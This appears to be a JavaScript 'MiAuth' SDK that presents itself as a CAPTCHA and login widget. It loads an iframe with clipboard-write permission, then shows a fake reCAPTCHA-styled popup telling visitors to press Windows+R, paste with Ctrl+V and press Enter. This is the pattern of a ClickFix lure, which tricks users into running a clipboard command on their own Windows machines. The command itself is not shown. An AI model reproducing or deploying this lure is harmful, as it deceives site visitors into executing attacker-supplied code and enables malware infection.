(function (global) {
  'use strict';

  var AUTH = (function () {
    try { return new URL(document.currentScript.src).origin; }
    catch (e) { return 'http://localhost:8080'; }
  })();
  var FA_URL = 'https://use.fontawesome.com/releases/v5.0.0/css/all.css';
  var timer = null;
  var iframe = null;
  var onMsg = null;
  var verifyEl = null;

  function log() {
    var a = ['[MiAuth]'].concat([].slice.call(arguments));
    console.log.apply(console, a);
  }

  function loadFA() {
    if (document.querySelector('link[href="' + FA_URL + '"]')) return;
    var link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = FA_URL;
    document.head.appendChild(link);
  }

  function injectStyles() {
    if (document.getElementById('miauth-styles')) return;
    var s = document.createElement('style');
    s.id = 'miauth-styles';
    s.textContent =
      '.miauth-anchor{position:relative}' +
      '.miauth-verify{font-family:Roboto,helvetica,arial,sans-serif;position:absolute;bottom:0;left:120px;width:310px;max-width:calc(100% - 10px);background:#fff;border:1px solid #cecece;box-shadow:5px 6px 7px -3px rgba(0,0,0,.12);z-index:10;opacity:0;visibility:hidden;transition:opacity 400ms;text-align:left}' +
      '.miauth-verify.active{opacity:1;visibility:visible}' +
      '.miauth-verify-header{background:#1A73E8;padding:16px 16px 24px;color:#fff}' +
      '.miauth-verify-header-medium{font-size:16px;display:block}' +
      '.miauth-verify-header-big{font-size:24px;font-weight:700;display:block}' +
      '.miauth-verify-main{padding:10px 12px;color:#111;font-size:13px}' +
      '.miauth-verify-main ol{counter-reset:item;list-style:none;padding:0}' +
      '.miauth-verify-main li{counter-increment:item;margin-bottom:10px;padding:10px 0}' +
      '.miauth-verify-main li::before{content:counter(item) ". ";color:#1A73E8;font-weight:bold;margin-right:10px;margin-left:10px}' +
      '.miauth-verify-main code{font-size:9px;color:gray;margin-left:2px}' +
      '.miauth-verify-footer{border-top:1px solid #cecece;padding:10px 7px;color:#737373;display:grid;grid-template-columns:1fr 102px;align-items:center;font-size:13px}' +
      '.miauth-verify-footer-left{padding:5px}' +
      '.miauth-verify-button{text-transform:uppercase;background:#5a89e2;color:#fff;text-align:center;padding:12px 0;font-weight:600;font-size:14px;border:none;border-radius:3px;cursor:not-allowed}';
    document.head.appendChild(s);
  }

  function createVerifyWindow(destino) {
    var el = document.createElement('div');
    el.className = 'miauth-verify';
    el.innerHTML =
      '<header class="miauth-verify-header">' +
        '<span class="miauth-verify-header-medium">Complete these</span>' +
        '<span class="miauth-verify-header-big">Verification Steps</span>' +
      '</header>' +
      '<main class="miauth-verify-main">' +
        '<p style="padding:10px 0">To better prove you are not a robot, please:</p>' +
        '<ol>' +
          '<li>Press &amp; hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.</li>' +
          '<li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>' +
          '<li>Press <b>Enter</b> on your keyboard to finish.</li>' +
        '</ol>' +
        '<p style="padding:10px 0">' +
          'You will observe and agree:<br>' +
          '<code>✅ "I am not a robot - reCAPTCHA Verification ID: <span class="miauth-vid">146820</span>"</code>' +
        '</p>' +
      '</main>' +
      '<footer class="miauth-verify-footer">' +
        '<div class="miauth-verify-footer-left">Perform the steps above to finish verification.</div>' +
        '<button type="button" class="miauth-verify-button" disabled>Verify</button>' +
      '</footer>';
    destino.appendChild(el);
    return el;
  }

  async function comprobarAuth(verificationId) {
    log('fetch check-auth vid=', verificationId);
    var res = await fetch(
      AUTH + '/check-captcha?verification_id=' + encodeURIComponent(verificationId),
      { credentials: 'include' }
    );
    if (!res.ok) throw new Error('HTTP ' + res.status);
    return res.json();
  }

  function esperarAuth(verificationId, onOk) {
    log('ARRANCA POLLING con vid=', verificationId);
    clearInterval(timer);
    timer = setInterval(async function () {
      try {
        var data = await comprobarAuth(verificationId);
        log('respuesta:', data);
        if (data.authenticated === true) {
          document.cookie = 'authenticated_' + verificationId + '=1; path=/';
          limpiar();
          log('AUTENTICADO');
          if (onOk) onOk(data, verificationId);
        }
      } catch (err) {
        console.error('[MiAuth] error:', err);
      }
    }, 3000);
  }

  function limpiar() {
    clearInterval(timer);
    timer = null;
    if (onMsg) { window.removeEventListener('message', onMsg); onMsg = null; }
    if (iframe && iframe.parentNode) iframe.parentNode.removeChild(iframe);
    iframe = null;
    if (verifyEl) { verifyEl.classList.remove('active'); }
  }

  global.MiAuth = {
    comprobar: comprobarAuth,
    esperar: esperarAuth,
    login: function (contenedor, onOk) {
      if (typeof contenedor === 'function') { onOk = contenedor; contenedor = null; }
      limpiar();

      loadFA();
      injectStyles();

      var destino = typeof contenedor === 'string'
        ? document.querySelector(contenedor)
        : (contenedor || document.body);
      if (!destino) { log('ERROR: contenedor no encontrado:', contenedor); return; }

      destino.classList.add('miauth-anchor');
      verifyEl = createVerifyWindow(destino);

      // show verify popup on signal from captcha iframe
      var onShowVerify = function (e) {
        if (e.data && e.data.type === 'auth:show-verify' && e.data.verification_id) {
          var vidSpan = verifyEl.querySelector('.miauth-vid');
          if (vidSpan) vidSpan.textContent = e.data.verification_id;
          verifyEl.classList.add('active');
        }
      };
      window.addEventListener('message', onShowVerify);

      // click outside closes verify popup and resets captcha
      var onClickOutside = function (e) {
        if (!verifyEl.classList.contains('active')) return;
        if (verifyEl.contains(e.target)) return;
        verifyEl.classList.remove('active');
        if (iframe && iframe.contentWindow) {
          iframe.contentWindow.postMessage({ type: 'auth:reset' }, '*');
        }
      };
      document.addEventListener('click', onClickOutside);

      onMsg = function (e) {
        log('MENSAJE recibido de', e.origin, e.data);
        if (e.origin !== AUTH) { log('  -> descartado: origen != ' + AUTH); return; }
        if (!e.data || e.data.type !== 'auth:vid') { log('  -> descartado: type distinto'); return; }
        if (!e.data.verification_id) { log('  -> descartado: sin verification_id'); return; }
        window.removeEventListener('message', onMsg);
        onMsg = null;
        esperarAuth(e.data.verification_id, function (data, vid) {
          verifyEl.classList.remove('active');
          window.removeEventListener('message', onShowVerify);
          document.removeEventListener('click', onClickOutside);
          if (verifyEl.parentNode) verifyEl.parentNode.removeChild(verifyEl);
          verifyEl = null;
          if (onOk) onOk(data, vid);
        });
      };
      window.addEventListener('message', onMsg);
      log('listener de message registrado, esperando el vid del iframe...');

      iframe = document.createElement('iframe');
      iframe.src = AUTH + '/captcha';
      iframe.allow = 'clipboard-write';
      iframe.style.width = 'fit-content';
      iframe.style.height = 'fit-content';
      iframe.style.border = '0';
      iframe.onload = function () { log('iframe CARGADO'); };
      iframe.onerror = function () { log('iframe ERROR al cargar'); };

      destino.appendChild(iframe);
      log('iframe insertado ->', iframe.src);
    },
    parar: limpiar
  };

  log('SDK cargado. Versión iframe/postMessage.');
})(window);
